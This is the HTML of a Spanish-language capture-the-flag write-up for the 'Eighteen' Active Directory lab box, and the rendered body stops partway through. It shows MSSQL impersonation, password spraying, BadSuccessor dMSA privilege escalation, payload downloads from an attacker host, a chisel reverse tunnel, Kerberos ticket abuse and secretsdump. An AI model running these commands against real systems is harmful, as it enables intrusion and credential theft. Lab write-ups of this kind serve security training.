@@ -1,0 +1,555 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Eighteen | Borhub Blog</title>
+<meta name="keywords" content="Easy, ActiveDirectory, MSSQL-Impersonar, Rid-brute, SharpHound, CanPSRemote, BadSuccesor, Chisel-AD">
+<meta name="description" content="
+As is common in real life Windows penetration tests, you will start the Eighteen box with credentials for the following account: kevin / iNa2we6haRj2gaw!
+Reconocimiento
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.95 -oG ports
+
+ports.py ports
+
+nmap -sCV 80,1433 10.10.11.95 -oN targeted
+
+Editamos el archivo hosts:
+10.10.11.95 eighteen.htb
+
+Y ahora empiezo a enumerar los puertos que hay abiertos, en este caso una web y un Microsoft SQL server.">
+<meta name="author" content="Borhub">
+<link rel="canonical" href="https://borhuub.github.io/writeups/eighteen/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.27492627d52d32d617e2faf58e652b2e2633796e5697eb3efd37682f981ae0f1.css" integrity="sha256-J0kmJ9UtMtYX4vr1jmUrLiYzeW5Wl&#43;s&#43;/TdoL5ga4PE=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="16x16" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="icon" type="image/png" sizes="32x32" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="apple-touch-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<link rel="mask-icon" href="https://borhuub.github.io/%3Clink%20/%20abs%20url%3E">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://borhuub.github.io/writeups/eighteen/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><meta property="og:url" content="https://borhuub.github.io/writeups/eighteen/">
+  <meta property="og:site_name" content="Borhub Blog">
+  <meta property="og:title" content="Eighteen">
+  <meta property="og:description" content="
+As is common in real life Windows penetration tests, you will start the Eighteen box with credentials for the following account: kevin / iNa2we6haRj2gaw!
+Reconocimiento nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.95 -oG ports ports.py ports nmap -sCV 80,1433 10.10.11.95 -oN targeted Editamos el archivo hosts:
+10.10.11.95 eighteen.htb Y ahora empiezo a enumerar los puertos que hay abiertos, en este caso una web y un Microsoft SQL server.">
+  <meta property="og:locale" content="en-us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="writeups">
+    <meta property="article:tag" content="Easy">
+    <meta property="article:tag" content="ActiveDirectory">
+    <meta property="article:tag" content="MSSQL-Impersonar">
+    <meta property="article:tag" content="Rid-Brute">
+    <meta property="article:tag" content="SharpHound">
+    <meta property="article:tag" content="CanPSRemote">
+    <meta property="og:image" content="https://borhuub.github.io/%3C/static/logo_machines/eighteen.png%3E">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://borhuub.github.io/%3C/static/logo_machines/eighteen.png%3E">
+<meta name="twitter:title" content="Eighteen">
+<meta name="twitter:description" content="
+As is common in real life Windows penetration tests, you will start the Eighteen box with credentials for the following account: kevin / iNa2we6haRj2gaw!
+Reconocimiento
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.95 -oG ports
+
+ports.py ports
+
+nmap -sCV 80,1433 10.10.11.95 -oN targeted
+
+Editamos el archivo hosts:
+10.10.11.95 eighteen.htb
+
+Y ahora empiezo a enumerar los puertos que hay abiertos, en este caso una web y un Microsoft SQL server.">
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Writeups",
+      "item": "https://borhuub.github.io/writeups/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Eighteen",
+      "item": "https://borhuub.github.io/writeups/eighteen/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "Eighteen",
+  "name": "Eighteen",
+  "description": "\nAs is common in real life Windows penetration tests, you will start the Eighteen box with credentials for the following account: kevin / iNa2we6haRj2gaw!\nReconocimiento nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.95 -oG ports ports.py ports nmap -sCV 80,1433 10.10.11.95 -oN targeted Editamos el archivo hosts:\n10.10.11.95 eighteen.htb Y ahora empiezo a enumerar los puertos que hay abiertos, en este caso una web y un Microsoft SQL server.\n",
+  "keywords": [
+    "Easy", "ActiveDirectory", "MSSQL-Impersonar", "Rid-brute", "SharpHound", "CanPSRemote", "BadSuccesor", "Chisel-AD"
+  ],
+  "articleBody": "\nAs is common in real life Windows penetration tests, you will start the Eighteen box with credentials for the following account: kevin / iNa2we6haRj2gaw!\nReconocimiento nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.95 -oG ports ports.py ports nmap -sCV 80,1433 10.10.11.95 -oN targeted Editamos el archivo hosts:\n10.10.11.95 eighteen.htb Y ahora empiezo a enumerar los puertos que hay abiertos, en este caso una web y un Microsoft SQL server.\nEnumeración web Al parecer la aplicación web esta dedicada a ayudarte a planificar tu futuro financiero y lo primero que vemos al entrar es lo siguiente:\nPruebo a usar las credenciales que nos han proporcionado para registrarnos pero no son validas:\nEntonces me registro para ver que funcionalidades tiene la página:\nVeo que hay una pestaña llamada Admin pero cuando intentamos navegar a ella nos redirige a el panel de login.\nEnumeración mssql Vemos que si usamos las credenciales que nos han proporcionado, nos conseguimos autenticar en el servicio mssql.\nmssqlclient-py \"kevin\":'iNa2we6haRj2gaw!'@\"10.10.11.95\" Nuestro actual usuario no tiene permisos de admin:\nReviso si hay algún posible linked server pero solo tenemos el sql server principal:\nSELECT * FROM sys.servers; Revisando las bases de datos vemos que tenemos una base de datos no habitual llamada financial_planer:\nListando usuario descubro un usuario llamado ‘appdev’\nAhora listo los hashes de las contraseñas pero tampoco consigo nada:\nSELECT * FROM sys.sql_logins; Impersonating users - execute as login Como ahora si que se de la existencia del usuario appdev intento impersonarlo con “EXECUTE AS LOGIN”, lo cual me permite impersonarlo y luego enumerar la base de datos financial_planner la cual anteriormente no me estaba dejando enumerar:\nEXECUTE AS LOGIN = 'appdev'; SELECT * FROM financial_planner.INFORMATION_SCHEMA.TABLES; Ahora me cambio a la base de datos financial_planner y enumero la tabla users:\nuse financial_planner; SELECT * FROM users; Ahora usando un script en python crackeamos el hash obtenido de admin:\niloveyou1\nUser rid-brute \u0026\u0026 Password Spraying Tengo estas credenciales pero no consigo llegar a autenticar-me con ninguno de los usuario que hay en mssql, entonces lo siguiente que pruebo es hacer un rid brute para enumerar usuarios y a hacer un password spraying para ver si se ha dado algún tipo de password reuse.\nnxc mssql 10.10.11.95 -u \"kevin\" -p '' --local-auth --rid-brute nxc winrm 10.10.11.95 -u \"users.txt\" -p 'iloveyou1' Una vez estoy dentro de la máquina el primer paso que doy es subirme el archivo sharphound.ps1 para poder enumerar los permisos de los objetos de la máquina.\nBloodhound enumeration Compilando y ejecutando SharpHound.exe Para ello tengo que compilar el .exe para poder ejecutarlo, así que me clono el repositorio:\ngit clone https://github.com/SpecterOps/SharpHound Después entro en el y usando dotnet lo compilo:\ncd SharpHound dotnet restore . dotnet build Una vez con el binario compilado lo subo con la funcionalidad upload de evil-winrm, y lo ejecuto para empezar a coleccionar los datos:\nupload ../EXPLOIT/SharpHound/bin/Debug/net472/SharpHound.exe .\\SharpHound.exe --CollectionMethods All Lo descargo a mi máquina usando también la funcionalidad download de evil-winrm:\ndownload 20251122171336_BloodHound.zip Ahora ya con el archivo en nuestra máquina local lo analizamos con bloodhound.\nEscalada de privielgios CanPSRemote Abuse / FAILED Vemos que el usuario adma.scott tiene permisos CanPSRemote a través del grup IT sobre DC01.EIGHTEEN.HTB.\nComo veo que no logro realizar nada más con este permiso y no tenemos ningún puerto interesante expuesto por defecto pruebo a seguir enumerando.\nBadSuccesor Vulnerability Para ayudarme a entender como funciona esta vulnerabilidad me he basado en este articulo que encontré en internet:\nAbusing dMSA for Privilege Escalation\nDownload File with Powershell + Import-Module Nos descargamos PowerView.ps1 a nuestra máquina victima y luego importamos sus módulos para poder sacar información:\n(New-Object Net.WebClient).DownloadFile('http://10.10.15.142:8081/PowerView.ps1','C:\\Users\\adam.scott\\Documents\\PowerView.ps1') Una vez hecho esto, lo que necesitamos encontrar es si tenemos permisos para crear msDS-DelegatedManagedServiceAccount o para crear objetos secundarios en cualquier OU para crear una dMSA.\nChecking create child objects permission under Staff Script Identificador\nY ejecutando el siguiente script en powershell, confirmamos que tenemos permisos sobre la OU Staff gracias al gupo IT:\n(New-Object Net.WebClient).DownloadFile('http://10.10.15.142:8081/Get-BadSuccessorOUPermissions.ps1','C:\\Users\\adam.scott\\Desktop\\BadSuccessor.ps1') .\\BadSuccessor.ps1 Explotación dMSA Manual / FAILED Al final pude ver que podemos crear una dMSA dentro de la unidad organizativa Staff.\nNew-ADServiceAccount -Name \"attack_dMSA\" -DNSHostName \"dontcare.com\" -CreateDelegatedServiceAccount -PrincipalsAllowedToRetrieveManagedPassword \"DC01$\" -path \"OU=Staff,DC=eighteen,DC=htb\" Ahora que hemos creado y somos propretarios de esta dMSA, tenemos la capacidad de otrogarnos permisos para editar atributos de la misma. En este caso vamos a editar estos dos valores:\nmsDS-ManagedAccountPrecededByLink: en esta opción vamos a indicar el nombre destintivo (DN) de la cuenta a la que queremos remplazar.\nmsDS-DelegatedMSAState: establecemos el valor del estado de la dMSA en 2 para simular que la migración ha sido completada.\n$dMSA = [ADSI]\"LDAP://CN=attack_dMSA,OU=Staff,DC=eighteen,DC=htb\" $dMSA.Put(\"msDS-DelegatedMSAState\", 2) $dMSA.Put(\"msDS-ManagedAccountPrecededByLink\", \"CN=Administrator,CN=Users,DC=eighteen,DC=htb\") $dMSA.SetInfo() Al ejecutar el $dMSA.SetInfo() me daba un Acceso denegado que no puede solucionar, con lo cual tuve que buscar otras maneras para explotar esta vulnerabilidad.\nBadSuccessor.exe - Script Entonces buscando POC’s me encontré con BadSuccessor.exe (también lo descargamos a la máquina victima) que realiza el mismo proceso que intentamos manualmente pero esta vez si crea la dMSA y le añade los atributos correctamente:\n.\\BadSuccessor.exe escalate -targetOU \"OU=Staff,DC=eighteen,DC=htb\" -dmsa attack_dMSA2 -targetUser \"CN=Administrator,CN=Users,DC=eighteen,DC=htb\" -dnshostname DC01 -user adam.scott -dc-ip 10.10.11.95 Luego de realizar todo este proceso tengo el problema de que no puedo recibir el TGS (Ticket Garanted Service) y el password hash ya que no existe ningún ticket decido importar chisel para hacer port forwarding sobre el puerto de autenticación kerberos para generar un TGT ( Ticket Garanting Ticket).\nPort Forwarding with chisel + Abuse TGT Chisel Repository\nPort Forwarding Examples\nNos descargamos chisel a nuestra máquina atacante con wget:\nwget https://github.com/jpillora/chisel/releases/download/v1.11.3/chisel_1.11.3_windows_386.zip unzip -l chisel_1.11.3_windows_386.zip Luego montamos un servidor http y con .DownloadFile nos descargamos el archivo a la máquina victima:\n(New-Object Net.WebClient).DownloadFile('http://10.10.14.141:8081/chisel.exe','C:\\Users\\adam.scott\\Desktop\\mythings\\chisel.exe') Y ahora monto el servidor chisel en mi máquina atacante y el cliente chisel en la máquina víctima:\nchisel server -p 33 --reverse .\\chisel.exe client 10.10.14.141:33 R:socks (Necesitamos camabiar el archivo /etc/proxychains.conf a socks5)\nproxychains -q getTGT.py eighteen.htb/adam.scott:'iloveyou1' -dc-ip 10.10.11.95 -debug Aunque ejecute el comando con proxychains ahora recibimos el típico error de falta de sincronización con el servidor, con lo cual usando Faketime consigo solucionar este problema:\nTricks Faketime - Exegol\nfaketime '2025-11-28 05:41:58' zsh proxychains -q getTGT.py eighteen.htb/adam.scott:'iloveyou1' -dc-ip 10.10.11.95 Ahora que tenemos ya el TGT del usuario adam.scott, podemos impersonar a la dMSA “attack_dMSA2” para obtener un ticket kerberos .ccache.\nproxychains /root/.local/share/pipx/venvs/impacket/bin/getST.py -impersonate 'attack_dMSA2$' -dmsa -k -no-pass eighteen.htb/adam.scot -self export KRB5CCNAME=/workspace/HTB/Eighteen/CONTENT/attack_dMSA2\\$@krbtgt_EIGHTEEN.HTB@EIGHTEEN.HTB.ccache proxychains secretsdump.py -k -no-pass dc01.eighteen.htb -just-dc-user Administrator ",
+  "wordCount" : "1058",
+  "inLanguage": "en",
+  "image":"https://borhuub.github.io/%3C/static/logo_machines/eighteen.png%3E","datePublished": "0001-01-01T00:00:00Z",
+  "dateModified": "0001-01-01T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "Borhub"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://borhuub.github.io/writeups/eighteen/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "Borhub Blog",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://borhuub.github.io/%3Clink%20/%20abs%20url%3E"
+    }
+  }
+}
+</script>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://borhuub.github.io/" accesskey="h" title="Home (Alt + H)">
+                <img src="https://borhuub.github.io/apple-touch-icon.png" alt="" aria-label="logo"
+                    height="35">Home</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://borhuub.github.io/writeups/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://borhuub.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://borhuub.github.io/certs/" title="Certifications">
+                    <span>Certifications</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://borhuub.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://borhuub.github.io/writeups/">Writeups</a></div>
+    <h1 class="post-title entry-hint-parent">
+      Eighteen
+    </h1>
+    <div class="post-meta"><span>5 min</span>&nbsp;·&nbsp;<span>1058 words</span>&nbsp;·&nbsp;<span>Borhub</span>
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#reconocimiento" aria-label="Reconocimiento">Reconocimiento</a></li>
+                <li>
+                    <a href="#enumeraci%c3%b3n-web" aria-label="Enumeración web">Enumeración web</a></li>
+                <li>
+                    <a href="#enumeraci%c3%b3n-mssql" aria-label="Enumeración mssql">Enumeración mssql</a><ul>
+                        
+                <li>
+                    <a href="#impersonating-users---execute-as-login" aria-label="Impersonating users - execute as login">Impersonating users - execute as login</a></li>
+                <li>
+                    <a href="#user-rid-brute--password-spraying" aria-label="User rid-brute &amp;&amp; Password Spraying">User rid-brute &amp;&amp; Password Spraying</a></li></ul>
+                </li>
+                <li>
+                    <a href="#bloodhound-enumeration" aria-label="Bloodhound enumeration">Bloodhound enumeration</a><ul>
+                        
+                <li>
+                    <a href="#compilando-y-ejecutando-sharphoundexe" aria-label="Compilando y ejecutando SharpHound.exe">Compilando y ejecutando SharpHound.exe</a></li></ul>
+                </li>
+                <li>
+                    <a href="#escalada-de-privielgios" aria-label="Escalada de privielgios">Escalada de privielgios</a><ul>
+                        
+                <li>
+                    <a href="#canpsremote-abuse--failed" aria-label="CanPSRemote Abuse / FAILED">CanPSRemote Abuse / FAILED</a></li>
+                <li>
+                    <a href="#badsuccesor-vulnerability" aria-label="BadSuccesor Vulnerability">BadSuccesor Vulnerability</a><ul>
+                        
+                <li>
+                    <a href="#download-file-with-powershell--import-module" aria-label="Download File with Powershell &#43; Import-Module">Download File with Powershell + Import-Module</a></li>
+                <li>
+                    <a href="#checking-create-child-objects-permission-under-staff" aria-label="Checking create child objects permission under Staff">Checking create child objects permission under Staff</a></li>
+                <li>
+                    <a href="#explotaci%c3%b3n-dmsa" aria-label="Explotación dMSA">Explotación dMSA</a><ul>
+                        
+                <li>
+                    <a href="#manual---failed" aria-label="Manual  / FAILED">Manual  / FAILED</a></li>
+                <li>
+                    <a href="#badsuccessorexe---script" aria-label="BadSuccessor.exe - Script">BadSuccessor.exe - Script</a></li>
+                <li>
+                    <a href="#port-forwarding-with-chisel--abuse-tgt" aria-label="Port Forwarding with chisel &#43; Abuse TGT">Port Forwarding with chisel + Abuse TGT</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+            </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img alt="eighteen_machine" loading="lazy" src="/img/eighteen/eighteen_machine.png"></p>
+<p>As is common in real life Windows penetration tests, you will start the Eighteen box with credentials for the following account: kevin / iNa2we6haRj2gaw!</p>
+<h1 id="reconocimiento">Reconocimiento<a hidden class="anchor" aria-hidden="true" href="#reconocimiento">#</a></h1>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -p- --open -sS --min-rate <span class="m">5000</span> -vvv -n -Pn 10.10.11.95 -oG ports
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">ports.py ports
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nmap -sCV 80,1433 10.10.11.95 -oN targeted
+</span></span></code></pre></div><p><img alt="eighteen_machine_1" loading="lazy" src="/img/eighteen/eighteen_machine_1.png"></p>
+<p>Editamos el archivo hosts:</p>
+<pre tabindex="0"><code>10.10.11.95 eighteen.htb
+</code></pre><p><img alt="eighteen_machine_2" loading="lazy" src="/img/eighteen/eighteen_machine_2.png"></p>
+<p>Y ahora empiezo a enumerar los puertos que hay abiertos, en este caso una web y un Microsoft SQL server.</p>
+<h1 id="enumeración-web">Enumeración web<a hidden class="anchor" aria-hidden="true" href="#enumeración-web">#</a></h1>
+<p>Al parecer la aplicación web esta dedicada a ayudarte a planificar tu futuro financiero y lo primero que vemos al entrar es lo siguiente:</p>
+<p><img alt="eighteen_machine_3" loading="lazy" src="/img/eighteen/eighteen_machine_3.png"></p>
+<p>Pruebo a usar las credenciales que nos han proporcionado para registrarnos pero no son validas:</p>
+<p><img alt="eighteen_machine_4" loading="lazy" src="/img/eighteen/eighteen_machine_4.png"></p>
+<p>Entonces me registro para ver que funcionalidades tiene la página:</p>
+<p><img alt="eighteen_machine_5" loading="lazy" src="/img/eighteen/eighteen_machine_5.png"></p>
+<p>Veo que hay una pestaña llamada Admin pero cuando intentamos navegar a ella nos redirige a el panel de login.</p>
+<p><img alt="eighteen_machine_6" loading="lazy" src="/img/eighteen/eighteen_machine_6.png"></p>
+<h1 id="enumeración-mssql">Enumeración mssql<a hidden class="anchor" aria-hidden="true" href="#enumeración-mssql">#</a></h1>
+<p>Vemos que si usamos las credenciales que nos han proporcionado, nos conseguimos autenticar en el servicio mssql.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">mssqlclient-py <span class="s2">&#34;kevin&#34;</span>:<span class="s1">&#39;iNa2we6haRj2gaw!&#39;</span>@<span class="s2">&#34;10.10.11.95&#34;</span>
+</span></span></code></pre></div><p><img alt="eighteen_machine_7" loading="lazy" src="/img/eighteen/eighteen_machine_7.png"></p>
+<p>Nuestro actual usuario no tiene permisos de admin:</p>
+<p><img alt="eighteen_machine_8" loading="lazy" src="/img/eighteen/eighteen_machine_8.png"></p>
+<p>Reviso si hay algún posible linked server pero solo tenemos el sql server principal:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">servers</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p><img alt="eighteen_machine_9" loading="lazy" src="/img/eighteen/eighteen_machine_9.png"></p>
+<p>Revisando las bases de datos vemos que tenemos una base de datos no habitual llamada financial_planer:</p>
+<p><img alt="eighteen_machine_10" loading="lazy" src="/img/eighteen/eighteen_machine_10.png"></p>
+<p>Listando usuario descubro un usuario llamado &lsquo;appdev&rsquo;</p>
+<p><img alt="eighteen_machine_11" loading="lazy" src="/img/eighteen/eighteen_machine_11.png"></p>
+<p>Ahora listo los hashes de las contraseñas pero tampoco consigo nada:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">sys</span><span class="p">.</span><span class="n">sql_logins</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p><img alt="eighteen_machine_12" loading="lazy" src="/img/eighteen/eighteen_machine_12.png"></p>
+<h2 id="impersonating-users---execute-as-login">Impersonating users - execute as login<a hidden class="anchor" aria-hidden="true" href="#impersonating-users---execute-as-login">#</a></h2>
+<p>Como ahora si que se de la existencia del usuario <code>appdev</code> intento impersonarlo con &ldquo;EXECUTE AS LOGIN&rdquo;, lo cual me permite impersonarlo y luego enumerar la base de datos financial_planner la cual anteriormente no me estaba dejando enumerar:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">EXECUTE</span><span class="w"> </span><span class="k">AS</span><span class="w"> </span><span class="n">LOGIN</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;appdev&#39;</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">financial_planner</span><span class="p">.</span><span class="n">INFORMATION_SCHEMA</span><span class="p">.</span><span class="n">TABLES</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p><img alt="eighteen_machine_13" loading="lazy" src="/img/eighteen/eighteen_machine_13.png"></p>
+<p>Ahora me cambio a la base de datos financial_planner y enumero la tabla users:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">use</span><span class="w"> </span><span class="n">financial_planner</span><span class="p">;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">FROM</span><span class="w"> </span><span class="n">users</span><span class="p">;</span><span class="w">
+</span></span></span></code></pre></div><p><img alt="eighteen_machine_14" loading="lazy" src="/img/eighteen/eighteen_machine_14.png"></p>
+<p>Ahora usando un script en python crackeamos el hash obtenido de admin:</p>
+<p><img alt="eighteen_machine_15" loading="lazy" src="/img/eighteen/eighteen_machine_15.png"></p>
+<p>iloveyou1</p>
+<h2 id="user-rid-brute--password-spraying">User rid-brute &amp;&amp; Password Spraying<a hidden class="anchor" aria-hidden="true" href="#user-rid-brute--password-spraying">#</a></h2>
+<p>Tengo estas credenciales pero no consigo llegar a autenticar-me con ninguno de los usuario que hay en <code>mssql</code>, entonces lo siguiente que pruebo es hacer un <code>rid brute</code> para enumerar usuarios y a hacer un <code>password spraying</code> para ver si se ha dado algún tipo de password reuse.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc mssql 10.10.11.95 -u <span class="s2">&#34;kevin&#34;</span> -p <span class="s1">&#39;&#39;</span> --local-auth --rid-brute
+</span></span></code></pre></div><p><img alt="eighteen_machine_16" loading="lazy" src="/img/eighteen/eighteen_machine_16.png"></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc winrm 10.10.11.95 -u <span class="s2">&#34;users.txt&#34;</span> -p <span class="s1">&#39;iloveyou1&#39;</span>
+</span></span></code></pre></div><p><img alt="eighteen_machine_17" loading="lazy" src="/img/eighteen/eighteen_machine_17.png"></p>
+<p>Una vez estoy dentro de la máquina el primer paso que doy es subirme el archivo sharphound.ps1 para poder enumerar los permisos de los objetos de la máquina.</p>
+<h1 id="bloodhound-enumeration">Bloodhound enumeration<a hidden class="anchor" aria-hidden="true" href="#bloodhound-enumeration">#</a></h1>
+<h2 id="compilando-y-ejecutando-sharphoundexe">Compilando y ejecutando SharpHound.exe<a hidden class="anchor" aria-hidden="true" href="#compilando-y-ejecutando-sharphoundexe">#</a></h2>
+<p>Para ello tengo que compilar el .exe para poder ejecutarlo, así que me clono el repositorio:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">git clone https://github.com/SpecterOps/SharpHound
+</span></span></code></pre></div><p>Después entro en el y usando dotnet lo compilo:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> SharpHound
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">dotnet restore .
+</span></span><span class="line"><span class="cl">dotnet build
+</span></span></code></pre></div><p>Una vez con el binario compilado lo subo con la funcionalidad <code>upload</code> de <code>evil-winrm</code>, y lo ejecuto para empezar a coleccionar los datos:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">upload</span> <span class="p">../</span><span class="n">EXPLOIT</span><span class="p">/</span><span class="n">SharpHound</span><span class="p">/</span><span class="n">bin</span><span class="p">/</span><span class="n">Debug</span><span class="p">/</span><span class="n">net472</span><span class="p">/</span><span class="n">SharpHound</span><span class="p">.</span><span class="py">exe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">.\</span><span class="n">SharpHound</span><span class="p">.</span><span class="py">exe</span> <span class="p">-</span><span class="n">-CollectionMethods</span> <span class="n">All</span>
+</span></span></code></pre></div><p><img alt="eighteen_machine_18" loading="lazy" src="/img/eighteen/eighteen_machine_18.png"></p>
+<p>Lo descargo a mi máquina usando también la funcionalidad download de evil-winrm:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">download</span> <span class="n">20251122171336_BloodHound</span><span class="p">.</span><span class="py">zip</span>
+</span></span></code></pre></div><p>Ahora ya con el archivo en nuestra máquina local lo analizamos con bloodhound.</p>
+<h1 id="escalada-de-privielgios">Escalada de privielgios<a hidden class="anchor" aria-hidden="true" href="#escalada-de-privielgios">#</a></h1>
+<h2 id="canpsremote-abuse--failed">CanPSRemote Abuse / FAILED<a hidden class="anchor" aria-hidden="true" href="#canpsremote-abuse--failed">#</a></h2>
+<p><img alt="eighteen_machine_19" loading="lazy" src="/img/eighteen/eighteen_machine_19.png"></p>
